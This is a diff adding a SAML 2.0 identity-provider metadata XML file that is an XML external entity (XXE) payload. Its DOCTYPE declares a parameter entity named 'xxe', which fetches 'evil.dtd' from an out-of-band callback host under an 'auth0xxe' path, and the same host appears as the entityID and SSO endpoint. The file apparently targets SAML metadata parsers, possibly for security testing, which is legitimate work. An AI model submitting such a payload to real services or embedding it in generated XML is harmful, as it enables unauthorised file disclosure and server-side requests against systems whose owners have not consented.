@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE EntityDescriptor [
+  <!ENTITY % xxe SYSTEM "https://dag8rfe408jkobqr635gatkf9xpuiqfuu.oast.site/auth0xxe/evil.dtd">
+  %xxe;
+]>
+<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://dag8rfe408jkobqr635gatkf9xpuiqfuu.oast.site/auth0xxe">
+  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
+    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://dag8rfe408jkobqr635gatkf9xpuiqfuu.oast.site/auth0xxe/sso"/>
+  </IDPSSODescriptor>
+</EntityDescriptor>
